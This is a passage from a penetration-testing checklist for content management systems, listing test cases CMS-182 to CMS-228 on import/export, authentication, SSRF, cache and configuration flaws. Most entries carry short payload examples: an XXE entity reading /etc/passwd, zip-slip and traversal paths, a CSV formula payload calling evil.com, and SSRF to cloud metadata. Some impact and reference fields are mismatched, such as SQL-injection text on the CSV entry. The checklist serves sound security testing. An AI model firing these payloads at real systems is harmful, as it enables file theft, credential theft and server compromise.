## CMS-182 — Calendar Sync Data Injection
**Test Category:** Injection · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Editorial Calendar

**Test Steps:** 1. Import from external calendar 2. Include malicious data 3. XSS or injection

**Expected Result:** Imported data should be sanitized

**Payload Example:**

```
Import ICS with XSS in event title
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite / ICS File

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## CMS-183 — Import XXE Vulnerability
**Test Category:** XML External Entity · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Content Import / Export

**Test Steps:** 1. Import XML content file 2. Include XXE payload 3. Extract server files

**Expected Result:** XML parsing should disable entities

**Payload Example:**

```
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
```

**Impact:** XXE -&gt; local file read / SSRF / OOB exfiltration.

**Tools:** Burp Suite / XXEinjector

**References:** CWE-611; -&gt;[XXE checklist](#/checklist/xxe); PortSwigger XXE

---

## CMS-184 — Import XSS via Content
**Test Category:** Cross-Site Scripting · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Content Import / Export

**Test Steps:** 1. Create import file with XSS 2. Import content 3. XSS in imported content

**Expected Result:** Imported content should be sanitized

**Payload Example:**

```
Import containing <script>alert(1)</script>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## CMS-185 — Import SQL Injection
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Content Import / Export

**Test Steps:** 1. Create import with SQL payloads 2. Import content 3. SQL executed during import

**Expected Result:** Import should sanitize all fields

**Payload Example:**

```
CSV with SQL in content fields
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap / Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## CMS-186 — Import Path Traversal
**Test Category:** Path Traversal · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Content Import / Export

**Test Steps:** 1. Import with path traversal filenames 2. Overwrite system files 3. Achieve code execution

**Expected Result:** Import filenames should be sanitized

**Payload Example:**

```
Import with ../../../var/www/shell.php
```

**Impact:** Path traversal -&gt; secret/cross-user file read or out-of-dir write -&gt; RCE.

**Tools:** Burp Suite / evilarc

**References:** CWE-22; -&gt;[Path Traversal checklist](#/checklist/pathtraversal); PortSwigger path traversal; Orange Tsai

---

## CMS-187 — Import Zip Slip
**Test Category:** Path Traversal · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Content Import / Export

**Test Steps:** 1. Create zip with path traversal 2. Upload for import 3. Extract malicious files

**Expected Result:** Archive extraction should validate paths

**Payload Example:**

```
Zip entry: ../../../etc/cron.d/malicious
```

**Impact:** Path traversal -&gt; secret/cross-user file read or out-of-dir write -&gt; RCE.

**Tools:** Zip Slip Scanner / evilarc

**References:** CWE-22; -&gt;[Path Traversal checklist](#/checklist/pathtraversal); PortSwigger path traversal; Orange Tsai

---

## CMS-188 — Export IDOR
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Content Import / Export

**Test Steps:** 1. Export own content 2. Modify user_id 3. Export others' content

**Expected Result:** Export should verify ownership

**Payload Example:**

```
GET /api/export?user_id=victim
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman / Autorize

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## CMS-189 — Export Data Leak
**Test Category:** Information Disclosure · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Content Import / Export

**Test Steps:** 1. Export content 2. Include sensitive metadata 3. Expose internal data

**Expected Result:** Export should filter sensitive fields

**Payload Example:**

```
Export containing user passwords or internal IDs
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite / Postman

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## CMS-190 — Import CSRF
**Test Category:** Cross-Site Request Forgery · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** Content Import / Export

**Test Steps:** 1. Create page triggering import 2. Victim visits page 3. Malicious content imported

**Expected Result:** Import should require CSRF token

**Payload Example:**

```
<form action="/admin/import" enctype="multipart/form-data">
```

**Impact:** CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO.

**Tools:** Burp Suite CSRF PoC / Custom HTML

**References:** CWE-352; -&gt;[CSRF checklist](#/checklist/csrf); PortSwigger CSRF + SameSite

---

## CMS-191 — Import File Type Bypass
**Test Category:** File Upload Vulnerabilities · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Content Import / Export

**Test Steps:** 1. Rename malicious file to allowed extension 2. Import file 3. Bypass restrictions

**Expected Result:** File content should be validated

**Payload Example:**

```
.php renamed to .xml or .csv
```

**Impact:** Malicious file upload -&gt; RCE / stored XSS / parser XXE depending on handling.

**Tools:** Burp Suite / Upload Scanner

**References:** CWE-434; -&gt;[File Upload checklist](#/checklist/fileupload); PortSwigger File upload; ImageTragick

---

## CMS-192 — Export Path Traversal
**Test Category:** Path Traversal · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Content Import / Export

**Test Steps:** 1. Request export 2. Modify filename parameter 3. Overwrite or access files

**Expected Result:** Export paths should be validated

**Payload Example:**

```
filename=../../../etc/passwd
```

**Impact:** Path traversal -&gt; secret/cross-user file read or out-of-dir write -&gt; RCE.

**Tools:** Burp Suite / DotDotPwn

**References:** CWE-22; -&gt;[Path Traversal checklist](#/checklist/pathtraversal); PortSwigger path traversal; Orange Tsai

---

## CMS-193 — Import Size DoS
**Test Category:** Denial of Service · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Content Import / Export

**Test Steps:** 1. Upload extremely large import 2. Exhaust server resources 3. Service disruption

**Expected Result:** Import size should be limited

**Payload Example:**

```
Import 10GB file
```

**Impact:** Denial of service -&gt; availability impact for this feature / the app.

**Tools:** Burp Suite / curl

**References:** CWE-400; -&gt;[Race Condition checklist](#/checklist/racecondition); OWASP; PortSwigger

---

## CMS-194 — Export Rate Limiting Bypass
**Test Category:** Denial of Service · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Content Import / Export

**Test Steps:** 1. Request many exports rapidly 2. Exhaust server resources 3. DoS via export

**Expected Result:** Export should be rate-limited

**Payload Example:**

```
100 export requests per minute
```

**Impact:** Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse.

**Tools:** Burp Suite / Custom Scripts

**References:** CWE-799; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger

---

## CMS-195 — Import Duplicate Content Injection
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Content Import / Export

**Test Steps:** 1. Import duplicate content 2. Override existing content 3. Content hijacking

**Expected Result:** Duplicates should be handled properly

**Payload Example:**

```
Import with existing slug/ID
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Manual Testing

**References:** CWE-840; PortSwigger Business logic

---

## CMS-196 — CSV Injection in Export
**Test Category:** Injection · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Content Import / Export

**Test Steps:** 1. Create content with formula 2. Export to CSV 3. Formula executes when opened

**Expected Result:** CSV should escape formula characters

**Payload Example:**

```
Content: =CMD|'/C calc'!A0 or =HYPERLINK("http://evil.com")
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite / Excel

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## CMS-197 — Import SSRF via URL
**Test Category:** Server-Side Request Forgery · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Content Import / Export

**Test Steps:** 1. Find URL-based import 2. Provide internal URL 3. Access internal resources

**Expected Result:** Import URLs should be validated

**Payload Example:**

```
import_url=http://169.254.169.254/
```

**Impact:** SSRF -&gt; internal-service reach / cloud metadata credential theft.

**Tools:** Burp Suite / SSRFmap

**References:** CWE-918; -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF'; PortSwigger

---

## CMS-198 — Export Sensitive Fields
**Test Category:** Information Disclosure · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Content Import / Export

**Test Steps:** 1. Export content 2. Check for hidden fields 3. Find sensitive data

**Expected Result:** Only necessary fields should be exported

**Payload Example:**

```
Export containing password_hash or api_keys
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite / Manual Review

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## CMS-199 — Import Author Manipulation
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Content Import / Export

**Test Steps:** 1. Import content 2. Modify author field 3. Attribute content to others

**Expected Result:** Author should be validated

**Payload Example:**

```
Import with author_id of different user
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## CMS-200 — Concurrent Import Race Condition
**Test Category:** Race Condition · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Content Import / Export

**Test Steps:** 1. Import same content concurrently 2. Create duplicates or conflicts 3. Data inconsistency

**Expected Result:** Import should be atomic

**Payload Example:**

```
Parallel import requests
```

**Impact:** Race condition -&gt; limit/uniqueness bypass (duplicate accounts, rate-limit defeat, double-spend).

**Tools:** Turbo Intruder / Burp Suite

**References:** CWE-362; -&gt;[Race Condition checklist](#/checklist/racecondition); James Kettle Smashing the State Machine

---

## CMS-201 — Export Job Manipulation
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Content Import / Export

**Test Steps:** 1. Create export job 2. Modify job_id 3. Access others' exports

**Expected Result:** Export jobs should verify ownership

**Payload Example:**

```
GET /api/exports/jobs/victim_job_id/download
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## CMS-202 — Admin Panel Authentication Bypass
**Test Category:** Broken Authentication · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** General CMS Security

**Test Steps:** 1. Find admin panel 2. Test default credentials 3. Bypass authentication

**Expected Result:** Admin should require strong authentication

**Payload Example:**

```
admin:admin or admin:password
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite / Hydra / Default Creds

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## CMS-203 — Admin Panel Brute Force
**Test Category:** Broken Authentication · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General CMS Security

**Test Steps:** 1. Identify admin login 2. Brute force credentials 3. Gain access

**Expected Result:** Rate limiting should prevent brute force

**Payload Example:**

```
Password wordlist attack
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite Intruder / Hydra / Medusa

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## CMS-204 — Session Fixation
**Test Category:** Session Management · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General CMS Security

**Test Steps:** 1. Get session before login 2. Victim authenticates 3. Hijack session

**Expected Result:** Session should regenerate on login

**Payload Example:**

```
Fixed session ID attack
```

**Impact:** Session fixation/hijack -&gt; attacker rides the victim's authenticated session.

**Tools:** Burp Suite / Manual Testing

**References:** CWE-384; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Session management

---

## CMS-205 — Insecure Direct Object Reference Chain
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General CMS Security

**Test Steps:** 1. Access content 2. Access content's author 3. Access author's other content

**Expected Result:** All objects should verify authorization

**Payload Example:**

```
Chained IDOR: content->author->private_content
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Autorize

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## CMS-206 — Privilege Escalation via Role Manipulation
**Test Category:** Broken Access Control · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** General CMS Security

**Test Steps:** 1. Edit own profile 2. Add admin role 3. Escalate privileges

**Expected Result:** Role changes should require admin

**Payload Example:**

```
{"username":"test",role:"administrator"}
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## CMS-207 — Plugin/Extension Vulnerability
**Test Category:** Remote Code Execution · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** General CMS Security

**Test Steps:** 1. Identify CMS plugins 2. Find vulnerable versions 3. Exploit known CVEs

**Expected Result:** Plugins should be updated

**Payload Example:**

```
Known plugin exploits
```

**Impact:** Code/command execution -&gt; full server compromise.

**Tools:** WPScan / Burp Suite / CVE Database

**References:** CWE-94; -&gt;[Command Injection checklist](#/checklist/cmdi); PortSwigger; OWASP

---

## CMS-208 — Theme Vulnerability
**Test Category:** Remote Code Execution · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General CMS Security

**Test Steps:** 1. Identify CMS theme 2. Find vulnerable version 3. Exploit vulnerabilities

**Expected Result:** Themes should be updated

**Payload Example:**

```
Known theme exploits
```

**Impact:** Code/command execution -&gt; full server compromise.

**Tools:** WPScan / Burp Suite / CVE Database

**References:** CWE-94; -&gt;[Command Injection checklist](#/checklist/cmdi); PortSwigger; OWASP

---

## CMS-209 — Configuration File Exposure
**Test Category:** Information Disclosure · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** General CMS Security

**Test Steps:** 1. Access common config paths 2. Find exposed configuration 3. Extract credentials

**Expected Result:** Config files should be protected

**Payload Example:**

```
/wp-config.php or /config.yml.bak
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite / ffuf / dirsearch

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## CMS-210 — Debug Mode Information Leak
**Test Category:** Information Disclosure · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General CMS Security

**Test Steps:** 1. Trigger errors 2. Check for debug output 3. Extract sensitive information

**Expected Result:** Debug should be disabled in production

**Payload Example:**

```
Stack traces and internal paths exposed
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite / Error Triggering

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## CMS-211 — Database Backup Exposure
**Test Category:** Information Disclosure · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** General CMS Security

**Test Steps:** 1. Search for backup files 2. Download database backup 3. Extract all data

**Expected Result:** Backups should not be web-accessible

**Payload Example:**

```
/backup.sql or /database.sql.gz
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite / ffuf / dirsearch

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## CMS-212 — Installation Script Access
**Test Category:** Security Misconfiguration · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** General CMS Security

**Test Steps:** 1. Access installation script 2. Reinstall CMS 3. Take over site

**Expected Result:** Install scripts should be removed

**Payload Example:**

```
/install.php or /setup/
```

**Impact:** Security misconfiguration -&gt; weakened control exploitable via the mapped attack.

**Tools:** Burp Suite / Browser

**References:** CWE-16; OWASP Security Misconfiguration (A05)

---

## CMS-213 — Update Mechanism Hijacking
**Test Category:** Man-in-the-Middle · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** General CMS Security

**Test Steps:** 1. Intercept update check 2. Modify update response 3. Install malicious update

**Expected Result:** Updates should use HTTPS and verify signatures

**Payload Example:**

```
MITM on update server
```

**Impact:** Credentials/tokens over cleartext -&gt; network interception -&gt; account takeover.

**Tools:** Burp Suite / mitmproxy

**References:** CWE-319; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-ATHN-01

---

## CMS-214 — API Key Exposure
**Test Category:** Information Disclosure · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General CMS Security

**Test Steps:** 1. Search JavaScript files 2. Find exposed API keys 3. Abuse keys

**Expected Result:** API keys should be server-side

**Payload Example:**

```
CMS API keys in frontend code
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite / truffleHog / GitLeaks

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## CMS-215 — GraphQL Introspection
**Test Category:** Information Disclosure · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General CMS Security

**Test Steps:** 1. Query GraphQL schema 2. Find hidden fields 3. Access internal data

**Expected Result:** Introspection should be disabled

**Payload Example:**

```
{ __schema { types { fields { name } } } }
```

**Impact:** GraphQL abuse -&gt; introspection/IDOR/batching DoS -&gt; data exposure or availability.

**Tools:** GraphQL Voyager / Altair / Burp Suite

**References:** CWE-400; -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP GraphQL Cheat Sheet; PortSwigger

---

## CMS-216 — GraphQL Batching Attack
**Test Category:** Denial of Service · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General CMS Security

**Test Steps:** 1. Send batched queries 2. Include many operations 3. DoS server

**Expected Result:** Batch limits should be enforced

**Payload Example:**

```
[{query1},{query2},...{query1000}]
```

**Impact:** GraphQL abuse -&gt; introspection/IDOR/batching DoS -&gt; data exposure or availability.

**Tools:** GraphQL Tools / Burp Suite

**References:** CWE-400; -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP GraphQL Cheat Sheet; PortSwigger

---

## CMS-217 — REST API Authentication Bypass
**Test Category:** Broken Authentication · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General CMS Security

**Test Steps:** 1. Access API without auth 2. Find unprotected endpoints 3. Access sensitive data

**Expected Result:** All API endpoints should require auth

**Payload Example:**

```
/api/users without authentication
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite / Postman

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## CMS-218 — Webhook Injection
**Test Category:** Server-Side Request Forgery · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General CMS Security

**Test Steps:** 1. Configure webhook 2. Set internal URL 3. SSRF via webhook

**Expected Result:** Webhook URLs should be validated

**Payload Example:**

```
webhook_url=http://localhost:8080/admin
```

**Impact:** SSRF -&gt; internal-service reach / cloud metadata credential theft.

**Tools:** Burp Suite / SSRFmap

**References:** CWE-918; -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF'; PortSwigger

---

## CMS-219 — Cron Job Manipulation
**Test Category:** Remote Code Execution · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** General CMS Security

**Test Steps:** 1. Access cron configuration 2. Add malicious job 3. Execute code

**Expected Result:** Cron config should be protected

**Payload Example:**

```
Inject malicious cron command
```

**Impact:** Code/command execution -&gt; full server compromise.

**Tools:** Burp Suite / Manual Testing

**References:** CWE-94; -&gt;[Command Injection checklist](#/checklist/cmdi); PortSwigger; OWASP

---

## CMS-220 — File Manager Vulnerability
**Test Category:** Remote Code Execution · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** General CMS Security

**Test Steps:** 1. Access file manager 2. Upload malicious file 3. Execute code

**Expected Result:** File manager should restrict operations

**Payload Example:**

```
Upload shell via file manager
```

**Impact:** Code/command execution -&gt; full server compromise.

**Tools:** Burp Suite / Weevely

**References:** CWE-94; -&gt;[Command Injection checklist](#/checklist/cmdi); PortSwigger; OWASP

---

## CMS-221 — User Enumeration
**Test Category:** Information Disclosure · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General CMS Security

**Test Steps:** 1. Test login with different usernames 2. Compare responses 3. Enumerate users

**Expected Result:** Responses should be consistent

**Payload Example:**

```
Different error for valid vs invalid users
```

**Impact:** Username/account enumeration -&gt; a valid-target list that fuels credential stuffing / phishing / ATO.

**Tools:** Burp Suite Intruder / ffuf

**References:** CWE-204; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-IDNT-04

---

## CMS-222 — Password Reset Poisoning
**Test Category:** Broken Authentication · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General CMS Security

**Test Steps:** 1. Request password reset 2. Modify Host header 3. Capture reset link

**Expected Result:** Password reset should validate Host

**Payload Example:**

```
Host: evil.com in reset request
```

**Impact:** Host-header injection into this flow -&gt; password-reset poisoning / cache poisoning -&gt; account takeover.

**Tools:** Burp Suite / Email Capture

**References:** CWE-644; -&gt;[Host Header Injection checklist](#/checklist/hostheader); James Kettle Practical Web Cache Poisoning

---

## CMS-223 — CORS Misconfiguration
**Test Category:** Security Misconfiguration · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General CMS Security

**Test Steps:** 1. Send cross-origin request 2. Check CORS headers 3. Access data cross-origin

**Expected Result:** CORS should restrict origins

**Payload Example:**

```
Origin: https://evil.com with credentials
```

**Impact:** CORS misconfiguration -&gt; credentialed cross-origin secret theft -&gt; account takeover.

**Tools:** Burp Suite / curl

**References:** CWE-942; -&gt;[CORS checklist](#/checklist/cors); PortSwigger CORS; Christian Schneider

---

## CMS-224 — Clickjacking on Admin Panel
**Test Category:** UI Redressing · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** General CMS Security

**Test Steps:** 1. Frame admin panel 2. Create overlay UI 3. Trick admin to click

**Expected Result:** Admin should have X-Frame-Options

**Payload Example:**

```
Invisible iframe over admin actions
```

**Impact:** Clickjacking of a sensitive action -&gt; UI-redress-driven state change.

**Tools:** Burp Suite Clickbandit / Custom HTML

**References:** CWE-1021; -&gt;[CSRF checklist](#/checklist/csrf); OWASP Clickjacking; PortSwigger

---

## CMS-225 — Content Security Policy Bypass
**Test Category:** Security Misconfiguration · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General CMS Security

**Test Steps:** 1. Analyze CSP header 2. Find bypass 3. Execute XSS despite CSP

**Expected Result:** CSP should be comprehensive

**Payload Example:**

```
Exploit unsafe-inline or allowed sources
```

**Impact:** Security misconfiguration -&gt; weakened control exploitable via the mapped attack.

**Tools:** CSP Evaluator / Burp Suite

**References:** CWE-16; OWASP Security Misconfiguration (A05)

---

## CMS-226 — HTTP Request Smuggling
**Test Category:** Request Smuggling · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** General CMS Security

**Test Steps:** 1. Test CL.TE/TE.CL 2. Smuggle malicious request 3. Bypass security

**Expected Result:** HTTP parsing should be consistent

**Payload Example:**

```
CL.TE or TE.CL payload
```

**Impact:** HTTP request smuggling -&gt; cache poisoning / auth bypass / request hijacking.

**Tools:** Burp Suite HTTP Request Smuggler

**References:** CWE-444; -&gt;[Request Smuggling checklist](#/checklist/smuggling); James Kettle HTTP Desync Attacks

---

## CMS-227 — Cache Poisoning
**Test Category:** Web Cache Poisoning · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General CMS Security

**Test Steps:** 1. Find cacheable endpoint 2. Inject via unkeyed headers 3. Poison cache

**Expected Result:** Cache should not include unkeyed input

**Payload Example:**

```
X-Forwarded-Host injection
```

**Impact:** Web cache poisoning/deception -&gt; mass XSS/redirect or private-data disclosure.

**Tools:** Burp Suite / Param Miner

**References:** CWE-524; -&gt;[Web Cache Poisoning checklist](#/checklist/webcache); James Kettle Web Cache Poisoning/Deception

---

## CMS-228 — Web Cache Deception
**Test Category:** Information Disclosure · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General CMS Security

